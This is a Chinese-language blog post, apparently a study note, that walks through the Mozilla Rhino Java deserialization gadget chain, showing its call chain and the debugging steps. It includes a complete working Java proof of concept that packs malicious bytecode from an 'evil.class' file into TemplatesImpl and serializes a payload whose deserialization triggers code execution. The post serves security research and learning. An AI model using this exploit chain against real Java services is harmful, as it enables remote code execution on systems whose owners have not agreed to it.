<!DOCTYPE html>
<html lang="zh-CN">
    <head prefix="og: https://ogp.me/ns#">
  <meta charset="utf-8">
  <meta name="referrer" content="no-referrer" />
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta name="color-scheme" content="light dark">
  
  <title>Mozilla Rhino反序列化利用链学习 - Boogiepop Doesn&#39;t Laugh</title>
  
    <link rel="shortcut icon" href="/favicon.png">
  
  
    <link rel='manifest' href='/manifest.json'>
  

  
  
  
  <meta property="og:title" content="Mozilla Rhino反序列化利用链学习 - Boogiepop Doesn&#39;t Laugh" />
  
  <meta property="og:type" content="article" />
  
  <meta property="og:url" content="http://boogipop.com/2023/05/01/Mozilla%20Rhino%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%AD%A6%E4%B9%A0/index.html" />
  
  <meta property="og:image" content="/favicon.png" />
  
  <meta property="og:article:published_time" content="2023-05-01T15:03:28.000Z" />
  
  <meta property="og:article:author" content="Boogipop" />
  
  

  
<link rel="stylesheet" href="/css/var.css">

  
<link rel="stylesheet" href="/css/main.css">

  
<link rel="stylesheet" href="/css/typography.css">

  
<link rel="stylesheet" href="/css/code-highlighting.css">

  
<link rel="stylesheet" href="/css/components.css">

  
<link rel="stylesheet" href="/css/nav.css">

  
<link rel="stylesheet" href="/css/paginator.css">

  
<link rel="stylesheet" href="/css/footer.css">

  
<link rel="stylesheet" href="/css/post-list.css">

  
<link rel="stylesheet" href="/css/giscus.css">

  
  
<link rel="stylesheet" href="/css/rainbow-banner.css">

  
  
  
<link rel="stylesheet" href="/css/toc.css">

  
  
    
<link rel="stylesheet" href="/css/giscus.css">

  
  
  
  
<link rel="stylesheet" href="/css/post.css">

  
  
  
  
  

  
<meta name="generator" content="Hexo 6.3.0"></head>
    <body
        data-color-scheme="auto"
        data-uppercase-categories="true"
        
        data-rainbow-banner="true"
        data-rainbow-banner-shown="auto"
        data-rainbow-banner-month="6"
        data-rainbow-banner-colors="#e50000,#ff8d00,#ffee00,#008121,#004cff,#760188"
        
        data-config-root="/"
        
        data-toc="true"
        data-toc-max-depth="2"
        
        
    >
        <nav id="theme-nav">
    <div class="inner">
        <a class="title" href="/">Blog</a>
        <div class="nav-arrow"></div>
        <div class="nav-items">
            <a class="nav-item nav-item-home" href="/">Home</a>
            
            
            <a class="nav-item" href="/archives">Archives</a>
            
            
            
            <a class="nav-item" href="/friends">Friends</a>
            
            
            
            <a class="nav-item" href="/about">About</a>
            
            
            
            <a class="nav-item" href="/categories">Categories</a>
            
            
            
            <a class="nav-item nav-item-github nav-item-icon" href="https://github.com/MrWillCom" target="_blank" aria-label="GitHub">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-codepen nav-item-icon" href="https://codepen.io/mrwillcom" target="_blank" aria-label="CodePen">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-patreon nav-item-icon" href="https://www.patreon.com/MrWillCom" target="_blank" aria-label="Patreon">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-mastodon nav-item-icon" href="https://noc.social/@MrWillCom" target="_blank" aria-label="Mastodon">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-discord nav-item-icon" href="https://discord.gg/UKuFDjcfY8" target="_blank" aria-label="Discord">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-search nav-item-icon" href="/search" target="_blank" aria-label="Search">&nbsp;</a>
            
            
        </div>
    </div>
</nav>
        
<article class="post">
    <div class="meta">
        
        <div class="categories text-uppercase">
        
            <a href="/categories/At-Dawn/">At Dawn</a>
        
        </div>
        

        
        <div class="date" id="date">
            <span>May</span>
            <span>1,</span>
            <span>2023</span>
        </div>
        

        <h2 class="title">Mozilla Rhino反序列化利用链学习</h2>
    </div>

    <div class="divider"></div>

    <div class="content">
        <h1 id="Mozilla-Rhino介绍"><a href="#Mozilla-Rhino介绍" class="headerlink" title="Mozilla Rhino介绍"></a>Mozilla Rhino介绍</h1><p>Rhino的中文名是犀牛，我也不知道为什么作者这么取名，可能他喜欢犀牛吧（<br>ChatGPT先生的回答如下<br>Mozilla Rhino是一款基于Java语言的开源JavaScript引擎，可以嵌入到Java应用程序中，使得Java程序可以使用JavaScript语言进行编程。<br>使用Rhino可以实现在Java应用程序中运行JavaScript代码，从而扩展了Java的能力，比如可以动态地加载、编译和执行JavaScript代码，实现脚本化编程。<br>以下是使用Rhino的一些基本步骤：</p>
<ol>
<li>下载Rhino：可以从Mozilla Rhino的官方网站下载最新版本的Rhino。</li>
<li>导入Rhino：将Rhino的JAR文件导入到Java项目中，并将其添加到classpath中。</li>
<li>创建ScriptEngine：使用ScriptEngineManager类创建ScriptEngine对象，该对象将用于执行JavaScript代码。</li>
<li>执行JavaScript代码：使用ScriptEngine对象的eval()方法来执行JavaScript代码。</li>
</ol>
<p>下面是一个简单的示例代码，演示了如何使用Rhino执行JavaScript代码：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">javaCopy code</span><br><span class="line">    <span class="keyword">import</span> javax.script.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RhinoExample</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// create a script engine manager</span></span><br><span class="line">        <span class="type">ScriptEngineManager</span> <span class="variable">factory</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ScriptEngineManager</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// create a JavaScript engine</span></span><br><span class="line">        <span class="type">ScriptEngine</span> <span class="variable">engine</span> <span class="operator">=</span> factory.getEngineByName(<span class="string">&quot;JavaScript&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// evaluate JavaScript code from String</span></span><br><span class="line">        engine.eval(<span class="string">&quot;print(&#x27;Hello, world!&#x27;)&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个例子中，我们创建了一个ScriptEngineManager对象来管理ScriptEngine，然后通过getEngineByName()方法创建了一个JavaScript引擎。接着，我们使用eval()方法来执行一行简单的JavaScript代码，输出了“Hello, world!”这个字符串。<br>在实际的应用程序中，我们可以将Rhino用于各种用途，比如编写脚本、进行动态的代码生成和执行等。<br>用人话来说，Rhino库是用来在Java中执行Js代码的一个库，比如上述例子中我们可以运行print函数</p>
<h1 id="Rhino1链"><a href="#Rhino1链" class="headerlink" title="Rhino1链"></a>Rhino1链</h1><p>这一条链其实是比较长的也比较复杂，所以这里先给出调用链的逻辑图，这样可以缓解一些复杂程度，单看链长其实是没什么特别的，也不是特别长，主要是其中的一些细节需要注意</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">BadAttributeValueExpException.readObject()</span><br><span class="line">    NativeError.toString()</span><br><span class="line">        ScriptableObject.getProperty()</span><br><span class="line">            ScriptableObject.getImpl()</span><br><span class="line">                NativeJavaMethod.call()</span><br><span class="line">                    NativeJavaObject.unwrap()</span><br><span class="line">                        MemberBox.invoke()</span><br><span class="line">                            TemplatesImpl.newTransformer()</span><br></pre></td></tr></table></figure>
<p>同时我先放出poc。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.mozilla.javascript.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RhinoChain1</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">fileName</span> <span class="operator">=</span> <span class="string">&quot;MozillaRhino1.bin&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">Templates</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;Boogipop&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[] code= Files.readAllBytes(Paths.get(<span class="string">&quot;E:\\CTFLearning\\JackSonPOJO\\target\\classes\\org\\example\\evil.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes=&#123;code&#125;;</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_bytecodes&quot;</span>,codes);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 实例化 NativeError 类</span></span><br><span class="line">        Class&lt;?&gt;       nativeErrorClass       = Class.forName(<span class="string">&quot;org.mozilla.javascript.NativeError&quot;</span>);</span><br><span class="line">        Constructor&lt;?&gt; nativeErrorConstructor = nativeErrorClass.getDeclaredConstructor();</span><br><span class="line">        nativeErrorConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Scriptable</span> <span class="variable">nativeError</span> <span class="operator">=</span> (Scriptable) nativeErrorConstructor.newInstance();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 使用恶意类 TemplatesImpl 初始化 NativeJavaObject</span></span><br><span class="line">        <span class="comment">// 这样 unwrap 时会返回 tmpl 实例</span></span><br><span class="line">        <span class="comment">// 由于 NativeJavaObject 序列化时会调用 initMembers() 方法</span></span><br><span class="line">        <span class="comment">// 所以需要在实例化 NativeJavaObject 时也进行相关初始化</span></span><br><span class="line">        <span class="type">Context</span> <span class="variable">context</span>          <span class="operator">=</span> Context.enter();</span><br><span class="line">        <span class="type">NativeObject</span> <span class="variable">scriptableObject</span> <span class="operator">=</span> (NativeObject) context.initStandardObjects();</span><br><span class="line">        <span class="type">NativeJavaObject</span> <span class="variable">nativeJavaObject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">NativeJavaObject</span>(scriptableObject, templates, TemplatesImpl.class);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 使用 newTransformer 的 Method 对象实例化 NativeJavaMethod 类</span></span><br><span class="line">        <span class="type">Method</span> <span class="variable">newTransformer</span>   <span class="operator">=</span> TemplatesImpl.class.getDeclaredMethod(<span class="string">&quot;newTransformer&quot;</span>);</span><br><span class="line">        <span class="type">NativeJavaMethod</span> <span class="variable">nativeJavaMethod</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">NativeJavaMethod</span>(newTransformer, <span class="string">&quot;name&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 使用反射将 nativeJavaObject 写入到 NativeJavaMethod 实例的 prototypeObject 中</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">prototypeField</span> <span class="operator">=</span> ScriptableObject.class.getDeclaredField(<span class="string">&quot;prototypeObject&quot;</span>);</span><br><span class="line">        prototypeField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        prototypeField.set(nativeError, nativeJavaObject);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 将 GetterSlot 放入到 NativeError 的 slots 中</span></span><br><span class="line">        <span class="type">Method</span> <span class="variable">getSlot</span> <span class="operator">=</span> ScriptableObject.class.getDeclaredMethod(<span class="string">&quot;getSlot&quot;</span>, String.class, <span class="type">int</span>.class, <span class="type">int</span>.class);</span><br><span class="line">        getSlot.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">slotObject</span> <span class="operator">=</span> getSlot.invoke(nativeError, <span class="string">&quot;name&quot;</span>, <span class="number">0</span>, <span class="number">4</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 反射将 NativeJavaMethod 实例放到 GetterSlot 的 getter 里</span></span><br><span class="line">        <span class="comment">// ysoserial 调用了 setGetterOrSetter 方法，我这里直接反射写进去，道理都一样</span></span><br><span class="line">        Class&lt;?&gt; getterSlotClass = Class.forName(<span class="string">&quot;org.mozilla.javascript.ScriptableObject$GetterSlot&quot;</span>);</span><br><span class="line">        <span class="type">Field</span>    <span class="variable">getterField</span>     <span class="operator">=</span> getterSlotClass.getDeclaredField(<span class="string">&quot;getter&quot;</span>);</span><br><span class="line">        getterField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        getterField.set(slotObject, nativeJavaMethod);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 生成 BadAttributeValueExpException 实例，用于反序列化触发 toString 方法</span></span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">exception</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="string">&quot;su18&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">valField</span>  <span class="operator">=</span> exception.getClass().getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">        valField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        valField.set(exception, nativeError);</span><br><span class="line"></span><br><span class="line">        deserial(serial(exception));</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">serial</span><span class="params">(Object o)</span> <span class="keyword">throws</span> IOException, NoSuchFieldException &#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(baos);</span><br><span class="line">        <span class="comment">//Field writeReplaceMethod = ObjectStreamClass.class.getDeclaredField(&quot;writeReplaceMethod&quot;);</span></span><br><span class="line">        <span class="comment">//writeReplaceMethod.setAccessible(true);</span></span><br><span class="line">        oos.writeObject(o);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">base64String</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(baos.toByteArray());</span><br><span class="line">        <span class="keyword">return</span> base64String;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">deserial</span><span class="params">(String data)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] base64decodedBytes = Base64.getDecoder().decode(data);</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">bais</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(base64decodedBytes);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bais);</span><br><span class="line">        ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">Base64Encode</span><span class="params">(ByteArrayOutputStream bs)</span>&#123;</span><br><span class="line">        <span class="type">byte</span>[] encode = Base64.getEncoder().encode(bs.toByteArray());</span><br><span class="line">        <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(encode);</span><br><span class="line">        System.out.println(s);</span><br><span class="line">        System.out.println(s.length());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String field, Object arg)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> obj.getClass().getDeclaredField(field);</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        f.set(obj, arg);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>OK。准备就绪。那么就开始调试分析吧。<br>入口点自然是BadAttribute的toString。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1682942704478-936d24f6-c8fd-4db7-b755-3e187a976cd2.png#averageHue=%232a2c2a&clientId=u783c079d-4ee6-4&from=paste&height=624&id=u6174bc33&originHeight=780&originWidth=1655&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1791382&status=done&style=none&taskId=uce971860-abac-4cc0-892d-8558149ecc5&title=&width=1324" alt="image.png"><br>塞了一个NativeError对象，而这也是今天的主角。我们仔细看看这个类的构造吧。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1682942735193-7f528c8b-175c-4e30-8530-59ad0dd61260.png#averageHue=%232c2c27&clientId=u783c079d-4ee6-4&from=paste&height=333&id=ub9534b2c&originHeight=416&originWidth=1279&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=753554&status=done&style=none&taskId=ubf8dbd66-5f8a-420b-b419-8b23a9fa574&title=&width=1023.2" alt="image.png"><br>首先它继承<code>IdScriptableObject</code>，而IdScriptableObject又继承<code>ScriptableObject</code>，进而继承serializable接口，因此是可以被序列化和反序列化的。<br>随后就去调用了toString方法。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1682942852847-6dd89719-c3f4-40a9-a92f-ddd500605d38.png#averageHue=%23353632&clientId=u783c079d-4ee6-4&from=paste&height=118&id=u5b0d8ecd&originHeight=147&originWidth=708&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=152872&status=done&style=none&taskId=u21e8bb50-5cdf-4298-96ec-5deeb8c4e06&title=&width=566.4" alt="image.png"><br>跟进。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1682942869394-6c622c89-a362-487d-845b-cf82e06f32ab.png#averageHue=%232a2c2a&clientId=u783c079d-4ee6-4&from=paste&height=607&id=uc08a18ba&originHeight=759&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1995606&status=done&style=none&taskId=uacd6ecdb-e163-4e47-a03e-19f946eb02e&title=&width=1536" alt="image.png"><br>这里调用了<code>ScriptableObject.getProperty</code>，这是它父类的一个方法，参数是它本身(NativeError)。跟进。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1682942920177-0a934140-4ee0-496e-b263-5bcab679b0c1.png#averageHue=%232b2c2a&clientId=u783c079d-4ee6-4&from=paste&height=598&id=u6895130a&originHeight=747&originWidth=1919&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1974771&status=done&style=none&taskId=u489efbc8-855b-4ecf-a99f-47a7c7f0331&title=&width=1535.2" alt="image.png"><br>这里调用了NativeError.get方法，由于它自身是没有get的，因此用的是父类的。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1682942947546-798dd114-9189-403a-8617-4d458930aa39.png#averageHue=%232c2e2c&clientId=u783c079d-4ee6-4&from=paste&height=758&id=u10a1f355&originHeight=947&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=2481571&status=done&style=none&taskId=uda58047c-88cd-4fab-8d4a-a9947581d28&title=&width=1536" alt="image.png"><br>继续调父类的get。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1682942956381-5d9700b0-fe4a-4c03-bbb1-01ab005152cb.png#averageHue=%2331322e&clientId=u783c079d-4ee6-4&from=paste&height=134&id=u941aef8c&originHeight=168&originWidth=906&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=221631&status=done&style=none&taskId=u99ffbfde-8c6e-4d72-928d-c8ad48e2a65&title=&width=724.8" alt="image.png"><br>跟进getImpl。接下来就会有点多的内容了。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1682942990870-2d1332d5-a229-43b7-84db-79bcd3993bf6.png#averageHue=%232e312e&clientId=u783c079d-4ee6-4&from=paste&height=763&id=ud75289a6&originHeight=954&originWidth=1462&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1869914&status=done&style=none&taskId=u8644a7f5-9b55-4845-9299-99bc6f6718a&title=&width=1169.6" alt="image.png"><br>可以看到是调用了getSlot方法。返回一个Slot数组。我们这里跟进去看看逻辑<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1682943038744-87bc5c98-7d8d-4268-9308-7019cf2991e9.png#averageHue=%23282a28&clientId=u783c079d-4ee6-4&from=paste&height=591&id=uf7fa34fb&originHeight=739&originWidth=1442&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1424313&status=done&style=none&taskId=ubbbfab5e-7a8c-448c-900a-b12b4decfb1&title=&width=1153.6" alt="image.png"><br>判断是不是GetterSlot实例，如果是就返回。从下方的变量来看是的。所以直接返回。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1682943117685-a647a414-5b60-41be-ac48-3f59fa9f5f06.png#averageHue=%232e312e&clientId=u783c079d-4ee6-4&from=paste&height=845&id=u3a6e6450&originHeight=1056&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=2712654&status=done&style=none&taskId=ub318310f-4342-486a-8918-46feacaba9d&title=&width=1536" alt="image.png"><br>随后退回getImpl方法，获取刚刚得到的slot的getter属性。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1682943147377-77457963-8dcc-40af-ab73-54adc44ec47a.png#averageHue=%232b2d2b&clientId=u783c079d-4ee6-4&from=paste&height=617&id=u9ba48c12&originHeight=771&originWidth=1788&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1988421&status=done&style=none&taskId=u8d131eba-d677-4747-930b-c2a8faabc72&title=&width=1430.4" alt="image.png"><br>获取到一个NativeJavaMethod实例。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1682943223604-70102dc4-6379-40e9-ac38-b73c4e7af8c4.png#averageHue=%232b2c28&clientId=u783c079d-4ee6-4&from=paste&height=418&id=u90bb1dec&originHeight=523&originWidth=1395&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1011043&status=done&style=none&taskId=u8f4b8f1a-d355-475c-a250-3a99a2962b2&title=&width=1116" alt="image.png"><br>随后判断delegateTo是否为空，这里delegateTo属性是trensit修饰，自然不能反射修改也不能赋值，所以是空的因此调用call方法。这里的f就是刚刚的getter对象也就是NativeJavaMethod实例，跟进call。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1682943524248-8ce0a255-d9c9-4fe4-8a73-e786c4035075.png#averageHue=%232c2e2b&clientId=u783c079d-4ee6-4&from=paste&height=691&id=u74673ab0&originHeight=864&originWidth=1496&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1815748&status=done&style=none&taskId=u0744b6ad-8cd8-4939-b5cf-dd53f3845a2&title=&width=1196.8" alt="image.png"><br>获取methods属性的第一个元素，这里我们在POC中把它改为了一个恶意的MethodBox<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1682943647656-ae8ebb3c-40b3-42d2-bb46-26338a561184.png#averageHue=%23272928&clientId=u783c079d-4ee6-4&from=paste&height=222&id=udf9ed500&originHeight=278&originWidth=884&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=341988&status=done&style=none&taskId=u3de1e989-c9b7-4444-a1af-92256e3e17a&title=&width=707.2" alt="image.png"></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span>(<span class="literal">true</span>) &#123;</span><br><span class="line">                       <span class="keyword">if</span> (o == <span class="literal">null</span>) &#123;</span><br><span class="line">                           <span class="keyword">throw</span> Context.reportRuntimeError3(<span class="string">&quot;msg.nonjava.method&quot;</span>, <span class="built_in">this</span>.getFunctionName(), ScriptRuntime.toString(thisObj), c.getName());</span><br><span class="line">                       &#125;</span><br><span class="line"></span><br><span class="line">                       <span class="keyword">if</span> (o <span class="keyword">instanceof</span> Wrapper) &#123;</span><br><span class="line">                           javaObject = ((Wrapper)o).unwrap();</span><br><span class="line">                           <span class="keyword">if</span> (c.isInstance(javaObject)) &#123;</span><br><span class="line">                               <span class="keyword">break</span>;</span><br><span class="line">                           &#125;</span><br><span class="line">                       &#125;</span><br><span class="line"></span><br><span class="line">                       o = o.getPrototype();</span><br><span class="line">                   &#125;</span><br><span class="line">               &#125;</span><br></pre></td></tr></table></figure>
